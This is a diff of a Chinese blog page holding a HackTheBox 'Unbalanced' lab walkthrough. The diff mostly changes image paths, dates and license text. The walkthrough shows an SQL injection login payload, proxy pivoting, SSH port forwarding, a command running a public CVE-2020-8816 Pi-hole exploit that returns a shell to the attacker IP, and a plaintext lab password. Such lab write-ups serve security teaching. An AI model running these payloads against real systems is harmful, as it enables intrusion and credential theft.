@@ -464,7 +464,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <p>  Unbalanced 可能是自己做过的htb困难靶机中里最简单的一个。其主要难度来自于最开始的起手式部分。比较需要耐心,但是没有难度。而提权部分直接可以用nday打。这对于一个困难靶机而言基本太过简单了。所以到时简单分析下这个用到的cve。</p>
 <a id="more"></a>
 
-<p><img src="/2020/08/15/hackthebox-Unbalanced/head.PNG" class="lazyload" data-srcset="hackthebox-Unbalanced/head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p><img src="/2020/08/15/hackthebox-Unbalanced/head.PNG" class="lazyload" data-srcset="head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <ul>
 <li>靶机 10.10.10.200</li>
 <li>攻击机 10.10.14.11</li>
@@ -496,9 +496,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </ul>
 <p>那就很明显了。我们之前namp也没有找到squid以外的web服务。既然如此,直接使用它这个代理服务器作代理就能访问内网网页了。</p>
 <p>修改浏览器的代理改为<code>10.10.10.200:3128</code>.再次访问<code>intranet.unbalanced.htb</code></p>
-<p><img src="/2020/08/15/hackthebox-Unbalanced/0.PNG" class="lazyload" data-srcset="hackthebox-Unbalanced/0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p><img src="/2020/08/15/hackthebox-Unbalanced/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>现在我们可以访问到页面.它会重定向我们到<code>/inranet.php</code>。不过这个登录界面没啥东西。可能需要进一步利用。唯一稍微泄露出相关信息的内容在headers里</p>
-<p><img src="/2020/08/15/hackthebox-Unbalanced/1.PNG" class="lazyload" data-srcset="hackthebox-Unbalanced/1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p><img src="/2020/08/15/hackthebox-Unbalanced/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>这时想起我们之前的cache manager密码。搜索一波如何利用。</p>
 <blockquote>
 <p>The cache manager (cachemgr.cgi) is a CGI utility for displaying statistics about the squid process as it runs</p>
@@ -509,7 +509,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>可以看到除了squid配置中已经标出的可用命令外,其他都是disabled的。所以我们依次调用下寻找关键信息。<br>在调用到<code>fqdncache</code>时</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">FQDN Cache Statistics:</span><br><span class="line">FQDNcache Entries In Use: 13</span><br><span class="line">FQDNcache Entries Cached: 11</span><br><span class="line">FQDNcache Requests: 12782</span><br><span class="line">FQDNcache Hits: 0</span><br><span class="line">FQDNcache Negative Hits: 7080</span><br><span class="line">FQDNcache Misses: 5702</span><br><span class="line">FQDN Cache Contents:</span><br><span class="line"></span><br><span class="line">Address                                       Flg TTL Cnt Hostnames</span><br><span class="line">10.10.14.6                                     N  -16959   0</span><br><span class="line">127.0.1.1                                       H -001   2 unbalanced.htb unbalanced</span><br><span class="line">::1                                             H -001   3 localhost ip6-localhost ip6-loopback</span><br><span class="line">172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb</span><br><span class="line">172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb</span><br><span class="line">10.10.10.200                                   N  -1086   0</span><br><span class="line">127.0.0.1                                       H -001   1 localhost</span><br><span class="line">172.17.0.1                                      H -001   1 intranet.unbalanced.htb</span><br><span class="line">ff02::1                                         H -001   1 ip6-allnodes</span><br><span class="line">ff02::2                                         H -001   1 ip6-allrouters</span><br><span class="line">10.10.14.65                                    N  025   0</span><br></pre></td></tr></table></figure>
 
-<p>看到<code>intranet-host3.unbalanced.htb</code>及对应的ip。不难想到内网里可能还有其他服务。这里先访问<code>172.31.179.2</code>与<code>172.31.179.3</code>.发现会被重定向到<code>/inranet.php</code>也就是跟之前同样的网页。但是顺着访问<code>172.31.179.1</code>时<br><img src="/2020/08/15/hackthebox-Unbalanced/2.PNG" class="lazyload" data-srcset="hackthebox-Unbalanced/2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>看到<code>intranet-host3.unbalanced.htb</code>及对应的ip。不难想到内网里可能还有其他服务。这里先访问<code>172.31.179.2</code>与<code>172.31.179.3</code>.发现会被重定向到<code>/inranet.php</code>也就是跟之前同样的网页。但是顺着访问<code>172.31.179.1</code>时<br><img src="/2020/08/15/hackthebox-Unbalanced/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>没有出现重定向。这种怪异行为值得重视。我们再次访问<code>172.31.179.1/intranet.php</code>。这次尝试登录时,会发现它会回显<code>Invalid credentials.</code>.也就是说可以跟服务交互了。</p>
 <p>既然如此肯定就要在登录参数作文章。无非不就是sqli那一套。简单尝试后发现密码处存在注入.当以<code>abc&#39; or &#39;1&#39;=&#39;1</code>作为密码时会回显四个用户名与对应邮箱。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> rita</span><br><span class="line">Rita Fubelli</span><br><span class="line"></span><br><span class="line">rita@unbalanced.htb</span><br><span class="line"></span><br><span class="line">Role: HR Manager</span><br><span class="line"></span><br><span class="line">jim</span><br><span class="line">Jim Mickelson</span><br><span class="line"></span><br><span class="line">jim@unbalanced.htb</span><br><span class="line"></span><br><span class="line">Role: Web Designer</span><br><span class="line"></span><br><span class="line">bryan</span><br><span class="line">Bryan Angstrom</span><br><span class="line"></span><br><span class="line">bryan@unbalanced.htb</span><br><span class="line"></span><br><span class="line">Role: System Administrator</span><br><span class="line"></span><br><span class="line">sarah</span><br><span class="line">Sarah Goodman</span><br><span class="line"></span><br><span class="line">sarah@unbalanced.htb</span><br><span class="line"></span><br><span class="line">Role: Team Leader</span><br></pre></td></tr></table></figure>
@@ -533,16 +533,16 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>8080与5553明显是跑在本地上的。其中8080可以curl到。不过会提醒我们hostname不对。</p>
 <p>既然是个web服务。那先端口转发到本地看看长什么样。我们直接用ssh转发</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~C <span class="comment">#进入ssh命令行</span></span><br><span class="line">-L 8080:127.0.0.1:8080</span><br></pre></td></tr></table></figure>
-<p>增加一个<code>Host: unbalanced</code><br><img src="/2020/08/15/hackthebox-Unbalanced/3.PNG" class="lazyload" data-srcset="hackthebox-Unbalanced/3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>增加一个<code>Host: unbalanced</code><br><img src="/2020/08/15/hackthebox-Unbalanced/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>再次暴露了一个<code>pihole.unbalanced.htb</code>.以及对应的内网ip.</p>
 <p>访问这个pihole的后台<code>/admin</code>.因为之前提示过我们temporary admin password .所以用admin就能登入。进去后发现是个4.3.2版本的pihole.</p>
-<p><img src="/2020/08/15/hackthebox-Unbalanced/4.PNG" class="lazyload" data-srcset="hackthebox-Unbalanced/4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p><img src="/2020/08/15/hackthebox-Unbalanced/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>暂时没思路。不过搜索下发现版本在CVE-2020-8816可用范围内。这个是可以直接rce拿到www-data的shell的。虽然跟我们提权root没啥关系。但是不妨一试。<br>用这的exp<br><a href="https://github.com/AndreyRainchik/CVE-2020-8816" target="_blank" rel="noopener">https://github.com/AndreyRainchik/CVE-2020-8816</a></p>
-<p>因为我们已经转发好端口了。所以直接打就是了<br><code>python3 CVE-2020-8816.py http://127.0.0.1:8080 admin 10.10.14.11 90001</code><br><img src="/2020/08/15/hackthebox-Unbalanced/5.PNG" class="lazyload" data-srcset="hackthebox-Unbalanced/5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/08/15/hackthebox-Unbalanced/6.PNG" class="lazyload" data-srcset="hackthebox-Unbalanced/6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>因为我们已经转发好端口了。所以直接打就是了<br><code>python3 CVE-2020-8816.py http://127.0.0.1:8080 admin 10.10.14.11 90001</code><br><img src="/2020/08/15/hackthebox-Unbalanced/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/08/15/hackthebox-Unbalanced/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>www-data的话肯定得继续收集信息了。但是我意想不到的是www-data居然可以直接进这个docker的root目录……简直可怕。然后里面有之前提到的config文件</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add domains to whitelist</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -w unbalanced.htb</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -w rebalanced.htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set temperature unit to Celsius</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -a -c</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add local host record</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set privacy level</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -a -l 4</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set web admin interface password</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -a -p <span class="string">'bUbBl3gUm$43v3Ry0n3!'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set admin email</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -a email admin@unbalanced.htb</span><br></pre></td></tr></table></figure>
 
-<p>admin的密码又是一个跟<code>bubblegum</code>有关的……试了下ssh登录root没成。su一下居然就成了……<br><img src="/2020/08/15/hackthebox-Unbalanced/7.PNG" class="lazyload" data-srcset="hackthebox-Unbalanced/7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>admin的密码又是一个跟<code>bubblegum</code>有关的……试了下ssh登录root没成。su一下居然就成了……<br><img src="/2020/08/15/hackthebox-Unbalanced/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>怎么说呢。提权这块只要nday poc就能拿www-data =&gt; 然后就可以进root目录=&gt; 然后系统密码直接就暴露出来了。这一连串操作令人窒息。有点刻意而且让这台靶机的体验直接降了一个档次。所以没啥总结的。</p>
 <h2 id="CVE-2020-8816"><a href="#CVE-2020-8816" class="headerlink" title="CVE-2020-8816"></a>CVE-2020-8816</h2><p>因为后面没什么收获，所以简单看了下这个cve。发现还挺有意思的。</p>
 <p><a href="https://xz.aliyun.com/t/7511" target="_blank" rel="noopener">https://xz.aliyun.com/t/7511</a></p>
@@ -587,11 +587,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
                 <p>本文永久链接是：<a href=https://www.bycsec.top/2020/08/15/hackthebox-Unbalanced/>https://www.bycsec.top/2020/08/15/hackthebox-Unbalanced/</a></p>
               
             
-              
-                <p>欢迎打赏！ 您的支持将是我创作的重要动力</p>
-
-              
-            
           </blockquote>
         </div>
       
@@ -614,10 +609,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-12-22T14:36:04+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-18T13:09:27+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Dec 22, 2020</p>
+    <p>更新于：Feb 18, 2021</p>
   </a>
 </div>
 
@@ -778,7 +773,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客内容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
 </div>
       
     
@@ -792,7 +787,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         本站使用
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作为主题
+        作為主題
       
     
       
